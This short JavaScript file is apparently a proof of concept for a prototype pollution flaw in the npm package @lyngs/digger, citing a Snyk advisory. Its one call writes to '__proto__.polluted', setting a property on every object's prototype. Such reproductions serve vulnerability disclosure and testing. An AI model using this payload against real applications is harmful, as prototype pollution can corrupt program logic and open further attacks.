//https://security.snyk.io/vuln/SNYK-JS-LYNGSDIGGER-1069826
 
  const { digger } = require("@lyngs/digger");
   
  digger({}, "__proto__.polluted", "yes", { extend: true });
// End of file
